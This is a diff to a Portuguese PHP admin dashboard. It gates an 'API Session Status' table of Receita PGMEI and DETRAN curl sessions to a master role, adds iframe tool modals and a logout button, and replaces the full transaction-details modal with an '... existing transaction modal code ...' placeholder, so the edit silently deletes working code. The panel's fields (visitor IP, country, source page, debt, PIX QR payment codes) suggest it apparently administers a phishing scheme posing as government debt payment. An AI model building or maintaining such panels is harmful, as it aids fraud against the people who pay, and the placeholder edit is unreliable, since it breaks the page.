@@ -834,6 +834,7 @@ if($DadosIp){
                 </section>
 
                 <!-- API Session Status -->
+                <?php if($user['role'] == 'master'){ ?>
                 <section class="table-section" id="apiStatusSection" style="margin-top: var(--space-lg); margin-bottom: var(--space-lg);">
                     <div class="table-header" style="display: flex; justify-content: space-between; align-items: center; cursor: pointer;" onclick="toggleSection('apiStatusBody', 'apiStatusIcon')">
                         <div style="display: flex; align-items: center; gap: 12px;">
@@ -859,19 +860,26 @@ if($DadosIp){
                                     <td><strong>PGMEI (Receita)</strong></td>
                                     <td><span id="exp-pgmei">0</span></td>
                                     <td><span id="date-pgmei">--</span></td>
-                                    <td><a href="../atualizar_pgmei_por_curl.php" class="ver-button">CONFIGURAR CURL</a></td>
+                                    <td><button onclick="openTool('../atualizar_pgmei_por_curl.php')" class="ver-button">CONFIGURAR CURL</button></td>
                                 </tr>
                                 <tr>
                                     <td><strong>DETRAN ES</strong></td>
                                     <td><span id="exp-es">0</span></td>
                                     <td><span id="date-es">--</span></td>
-                                    <td><a href="../atualizar_es_por_curl.php" class="ver-button">CONFIGURAR CURL</a></td>
+                                    <td><button onclick="openTool('../atualizar_es_por_curl.php')" class="ver-button">CONFIGURAR CURL</button></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>DETRAN SC</strong></td>
+                                    <td><span id="exp-sc">0</span></td>
+                                    <td><span id="date-sc">--</span></td>
+                                    <td><button onclick="openTool('../cadastrar_curl_sc.php')" class="ver-button">CONFIGURAR CURL</button></td>
                                 </tr>
                                 <tr><td colspan="4" style="text-align: center; padding: 2rem; color: #9ca3af;">Carregando status...</td></tr>
                             </tbody>
                         </table>
                     </div>
                 </section>
+                <?php } ?>
 
                 <style>
                     .section-collapsed {
@@ -1229,12 +1237,18 @@ if($DadosIp){
                     </div>
                 </div>
 
-                <div class="modal-footer">
-                    <button class="btn btn-outline" id="cancelConfig">Cancelar</button>
-                    <button class="btn btn-primary" id="saveConfig" disabled>
-                        <i data-lucide="save"></i>
-                        Salvar
+                <div class="modal-footer" style="justify-content: space-between;">
+                    <button class="btn btn-outline danger" id="logoutBtn" onclick="window.location.href='../logout.php'" style="color: #ef4444; border-color: rgba(239, 68, 68, 0.2); background: rgba(239, 68, 68, 0.05);">
+                        <i data-lucide="log-out"></i>
+                        Sair do Sistema
                     </button>
+                    <div style="display: flex; gap: 0.5rem;">
+                        <button class="btn btn-outline" id="cancelConfig">Cancelar</button>
+                        <button class="btn btn-primary" id="saveConfig" disabled>
+                            <i data-lucide="save"></i>
+                            Salvar
+                        </button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1366,50 +1380,23 @@ if($DadosIp){
 
         <!-- Transaction Details Modal -->
         <div class="modal-overlay" id="transactionModal">
-            <div class="modalFa transaction-modal">
+            <!-- ... existing transaction modal code ... -->
+        </div>
+
+        <!-- Tool Modal (Iframe) -->
+        <div class="modal-overlay" id="toolModal">
+            <div class="modal" style="max-width: 800px; height: 90vh; display: flex; flex-direction: column;">
                 <div class="modal-header">
                     <h3>
-                        <i data-lucide="eye"></i>
-                        Detalhes da Transação
+                        <i data-lucide="wrench"></i>
+                        Ferramenta de Configuração
                     </h3>
-                    <button class="modal-close" id="closeTransactionModal">
+                    <button class="modal-close" id="closeToolModal">
                         <i data-lucide="x"></i>
                     </button>
                 </div>
-                <div class="modal-body transaction-body">
-                    <div>
-                        <div class="transaction-summary">
-                            <div class="meta">
-                                <span><strong id="transactionId">-</strong></span>
-                                <span id="transactionPage">-</span>
-                            </div>
-                            <span class="status-badge" id="transactionStatus">-</span>
-                        </div>
-                        <div class="transaction-info">
-                            <div class="info-block"><label>Nome</label><div class="value" id="transactionNome">-</div></div>
-                            <div class="info-block"><label>Documento</label><div class="value" id="transactionDoc">-</div></div>
-                            <div class="info-block"><label>Débito</label><div class="value" id="transactionDebito">-</div></div>
-                            <div class="info-block"><label>Valor</label><div class="value" id="transactionValor">-</div></div>
-                            <div class="info-block"><label>IP</label><div class="value" id="transactionIp">-</div></div>
-                            <div class="info-block"><label>País</label><div class="value" id="transactionPais">-</div></div>
-                            <div class="info-block"><label>Identity</label><div class="value" id="transactionIdentity">-</div></div>
-                            <div class="info-block"><label>Hora</label><div class="value" id="transactionHora">-</div></div>
-                        </div>
-                    </div>
-                    <div class="qr-card" id="transactionQrWrapper">
-                        <div class="qr-spinner hidden" id="transactionQrSpinner"></div>
-                        <img id="transactionQr" src="" alt="QR Code PIX">
-                        <textarea class="qr-code-box" id="transactionPixText" readonly></textarea>
-                        <div class="qr-actions">
-                            <button class="btn btn-primary" id="copyPixBtn" style="width: 100%;text-align: center;justify-content: center;">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" data-lucide="copy" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
-                                Copiar PIX
-                            </button>
-                        </div>
-                    </div>
-                </div>
-                <div class="modal-footer">
-                    <button class="btn btn-outline" id="closeTransactionFooter">Fechar</button>
+                <div class="modal-body" style="flex: 1; padding: 0; overflow: hidden;">
+                    <iframe id="toolIframe" src="" style="width: 100%; height: 100%; border: none;"></iframe>
                 </div>
             </div>
         </div>
